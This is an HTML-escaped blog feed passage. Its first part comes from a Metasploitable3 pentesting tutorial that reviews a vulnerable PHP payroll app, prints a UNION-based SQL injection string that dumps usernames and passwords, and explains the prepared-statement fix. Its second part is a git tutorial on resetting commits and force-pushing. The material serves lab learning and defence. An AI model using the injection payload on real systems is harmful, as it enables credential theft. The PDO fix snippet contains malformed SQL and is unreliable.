            &lt;span class=&quot;token comment&quot;&gt;/* store first result set */&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;&amp;lt;center&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;&amp;lt;h2&gt;Welcome, &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;&amp;lt;/h2&gt;&amp;lt;br&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;&amp;lt;table style=&apos;border-radius: 25px; border: 2px solid black;&apos; cellspacing=30&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;&amp;lt;tr&gt;&amp;lt;th&gt;Username&amp;lt;/th&gt;&amp;lt;th&gt;First Name&amp;lt;/th&gt;&amp;lt;th&gt;Last Name&amp;lt;/th&gt;&amp;lt;th&gt;Salary&amp;lt;/th&gt;&amp;lt;/tr&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;store_result&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;fetch_assoc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;token variable&quot;&gt;$keys&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;array_keys&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;&amp;lt;tr&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;token keyword&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$keys&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;&amp;lt;td&gt;&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;&amp;lt;/td&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
                    &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;&amp;lt;/tr&gt;\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;token variable&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;more_results&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;&amp;lt;/table&gt;&amp;lt;/center&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;next_result&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Our worst fears have come to light! Yes, the web application is leveraging string concatenation to build an SQL query. Gah! For those new to SQL Injection, forming SQL statements using string concatenation is really bad practice! It basically allows an attacker to craft their own SQL statement. If you are interested in more information about this topic, leave a comment and I can write a thorough post about it in the future.&lt;/p&gt;
&lt;p&gt;The summary of the problem is this line:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;select username, first_name, last_name, salary from users where username = &apos;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$user&lt;/span&gt;&lt;/span&gt;&apos; and password = &apos;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$pass&lt;/span&gt;&lt;/span&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To save you scrolling up, our SQL Injection that dumped the user passwords was:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sql&quot;&gt;&lt;pre class=&quot;language-sql&quot;&gt;&lt;code class=&quot;language-sql&quot;&gt;&apos; &lt;span class=&quot;token operator&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;UNION&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;username&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;password &lt;span class=&quot;token keyword&quot;&gt;FROM&lt;/span&gt; users&lt;span class=&quot;token comment&quot;&gt;#&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If we combine the two, our resultant SQL Injection attack is:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;select username, first_name, last_name, salary from users where username = &apos;&apos; OR 1=1 UNION SELECT null,null,username,password FROM users#&apos; and password = &apos;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This SQL Injection attack successfully leverages the weakness in string concatenation by altering the logic in the SQL query. As a quick summary: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;All users are displayed including the username, first name, last name and salary&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;This is because the first SQL query is always true:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;username = &quot;&quot;&lt;/code&gt; is always false&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;1=1&lt;/code&gt; is always true&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;username = &quot;&quot; OR 1=1&lt;/code&gt; is therefore, always true&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The &lt;code class=&quot;language-text&quot;&gt;UNION&lt;/code&gt; statement allows execution of an additional SQL statement where we leverage it to dump the username and password for each user&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;OK, that is interesting… but how can we fix this specific problem?&lt;/p&gt;
&lt;h4 id=&quot;mitigating-sql-injection-attacks-against-payroll_appphp&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#mitigating-sql-injection-attacks-against-payroll_appphp&quot; aria-label=&quot;mitigating sql injection attacks against payroll_appphp permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Mitigating SQL Injection Attacks Against &lt;code class=&quot;language-text&quot;&gt;payroll_app.php&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;This is the final topic we want to investigate in this post. Determining how we can fix the SQL Injection vulnerability. For web application security, the go-to resource is the Open Web Application Security Project or OWASP. They provide recommendations on how to correctly secure web applications. OWASP outline an &lt;a href=&quot;https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet&quot;&gt;SQL Injection Prevention Cheat Sheet&lt;/a&gt; which outlines good practice to mitigate SQL Injection vulnerabilities. &lt;/p&gt;
&lt;p&gt;We will not cover every aspect of mitigation, but will briefly discuss &lt;strong&gt;Defense Option 1: Prepared Statements (with Parameterized Queries)&lt;/strong&gt;. &lt;a href=&quot;https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet#Defense_Option_1:_Prepared_Statements_.28with_Parameterized_Queries.29&quot;&gt;OWASP recommend to use prepared statements&lt;/a&gt; to mitigate SQL Injection vulnerabilities. The specific recommendation for PHP is:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Use PDO with strongly typed parameterized queries (using bindParam())&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&quot;http://php.net/manual/en/book.pdo.php&quot;&gt;PHP Data Objects&lt;/a&gt;, or PDO, is the solution. Unfortunately, it is not a quick solution; for example, changing just the &lt;code class=&quot;language-text&quot;&gt;sql&lt;/code&gt; construction method. The bulk of the code to query the database and print the HTML table would require a re-write. Instead of a complete answer, a small comparison of the original SQL string and a PDO construct is sufficient.&lt;/p&gt;
&lt;p&gt;The code below is the original method used to create the SQL statement using the user input:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;select username, first_name, last_name, salary from users where username = &apos;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$user&lt;/span&gt;&lt;/span&gt;&apos; and password = &apos;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$pass&lt;/span&gt;&lt;/span&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The code below is a quick summary of what it should be, using PDO.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;prepare&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;SELECT FROM users (username, first_name, last_name, salary) WHERE username = :user AND password = :pass)&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Like I briefly mentioned, making the change above would require additional modification of the source code, including the method used to connect to the MySQL database too. If you are interested in this, please leave a comment below, it might be a good topic for another blog post. A very good tutorial on PDO is the &lt;a href=&quot;https://phpdelusions.net/pdo&quot;&gt;(The only proper) PDO tutorial&lt;/a&gt;, it is definitely worth a read.&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conclusion&quot; aria-label=&quot;conclusion permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;This tutorial was the first in a series about pentesting the Metasploitable3 Ubuntu Linux version. Hopefully, this tutorial gave you some ideas and knowledge about the SQL injection vulnerabilities in the &lt;em&gt;Payroll App&lt;/em&gt; that is running on the Metasploitable3 server. However, the most important part of this post is the review of the source code of the &lt;em&gt;Payroll App&lt;/em&gt; and understanding why SQL Injection vulnerabilities are present and how and why SQL injection attacks occur.&lt;/p&gt;
&lt;p&gt;In the next post, we will look at other open ports on Metasploitable3, the services that are running, and use the Metasploit Framework to exploit some vulnerabilities. Hope you enjoyed the post, and please leave a comment if you have any questions or information to share!&lt;/p&gt;</content:encoded></item><item><title><![CDATA[How to Reset and Revert Git Commits]]></title><description><![CDATA[I am exceptionally pedantic about my git commits. However, since I started using git locally, I have become much more relaxed. I put on my…]]></description><link>https://thomaslaurenson.com/blog/2018-07-07/how-to-reset-and-revert-git-commits/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-07-07/how-to-reset-and-revert-git-commits/</guid><pubDate>Sat, 07 Jul 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I am exceptionally pedantic about my git commits. However, since I started using git locally, I have become much more relaxed. I put on my headphones, blast some Metallica, get in the zone, and git commit like a mad person! It is a great place to be. Furiously coding and committing at an important juncture. However, this led me into bad habits. Reckless is a better word for it. I generally commit with a descriptive message, and push at logical times… but have gotten less precise lately. I have so many accounts and repositories I contribute to that I sometimes enter in the wrong credentials. I have a GitHub account, a GitLab account, and another GitLab account which is for code hosted at my work-place. It gets confusing. And I refuse to use any credential managers (I can hear people screaming in agony at that comment!). Again, this leads to commits that need to be… &lt;em&gt;taken ‘a back&lt;/em&gt;.&lt;/p&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#quickstart&quot;&gt;Quickstart&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#how-to-undo-in-git&quot;&gt;How to Undo in Git&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#example-scenario&quot;&gt;Example Scenario&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#undoing-the-last-commit&quot;&gt;Undoing the Last Commit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#undoing-a-specific-commit&quot;&gt;Undoing a Specific Commit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#how-to-undo-a-git-push&quot;&gt;How to Undo a Git Push&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#words-of-caution&quot;&gt;Words of Caution&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;introduction&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#introduction&quot; aria-label=&quot;introduction permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
&lt;p&gt;I was asking myself this question: how can I recover from an accidental &lt;code class=&quot;language-text&quot;&gt;git commit&lt;/code&gt; or &lt;code class=&quot;language-text&quot;&gt;git push&lt;/code&gt;? Which is basically summarised as: how to undo commits or pushes in git? After reading a few forum posts, riding the waves of stack overflow answers… I started to get it. I then performed a revert from a git push to my GitHub. The knowledge of how to do it was never achieved, mainly because I barely used this feature. Every time a &lt;/p&gt;
&lt;p&gt;This post will discuss how to undo unfortunate git commits… as well as git pushes. Hopefully, this post is useful to others as it was for me to document.&lt;/p&gt;
&lt;h2 id=&quot;quickstart&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#quickstart&quot; aria-label=&quot;quickstart permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Quickstart&lt;/h2&gt;
&lt;p&gt;If you want a quick answer, here are the following commands to undo a &lt;code class=&quot;language-text&quot;&gt;git commit&lt;/code&gt;: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Undo the last commit and do not remove the changes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;git reset --soft HEAD~1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Undo the last commit and remove the changes (from disk):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;git reset --hard HEAD~1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Undo a specific commit and do not remove the changes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;git reset --soft &amp;lt;commit-object-name&gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Undo a specific commit and remove the changes (from disk):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;git reset --hard &amp;lt;commit-object-name&gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Once you have fixed the &lt;em&gt;git index&lt;/em&gt; you can now fix the GitHub repository. Only one command is needed, and it is irrelevant which method you used to undo the original commit:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;git push origin master --force&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you want further information on what these commands are actually doing… keep reading!&lt;/p&gt;
&lt;h2 id=&quot;how-to-undo-in-git&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#how-to-undo-in-git&quot; aria-label=&quot;how to undo in git permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;How to Undo in Git&lt;/h2&gt;
&lt;p&gt;In the world of git (as used by GitHub) undoing something can be achieved using the following command:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;git reset&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;It should be noted that there are other command arguments that sound like they could be useful. For example, the &lt;code class=&quot;language-text&quot;&gt;revert&lt;/code&gt; argument will move a git repository to a specific commit, but it will keep all existing commits. Technically, &lt;strong&gt;this is not undoing&lt;/strong&gt; the commit history. &lt;/p&gt;
